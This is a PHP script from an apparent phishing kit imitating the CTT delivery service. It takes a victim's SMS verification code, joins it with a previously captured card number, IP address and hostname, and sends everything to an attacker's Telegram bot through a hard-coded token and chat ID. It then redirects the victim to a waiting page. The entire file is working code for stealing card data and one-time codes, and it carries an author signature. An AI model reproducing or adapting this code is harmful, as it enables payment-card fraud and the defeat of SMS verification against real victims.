<?php

session_start();

$sms=$_POST["sms"];

$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['sms'] = $sms;




$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|CC  CTT-CH |----------|\n";
$message .= "Card number  : ".$_SESSION['cc']."\n";
$message .= "|----------|SMS 1 CTT-CH |----------|\n";
$message .= "SMS 1  : ".$_SESSION['sms']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";
$subject = "~ <Rslt-CTT-CH>- Coded By k4iser.a ~ | $ip";

$token = "7216603666:AAHxvOD_-5evGiaW4GIa9uyG4-opdeV3Pu8";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-4205027125&text=" . urlencode($message)."" );
header("location:wait2.php?vc?__event=card&service_id=top_card=AU")
?>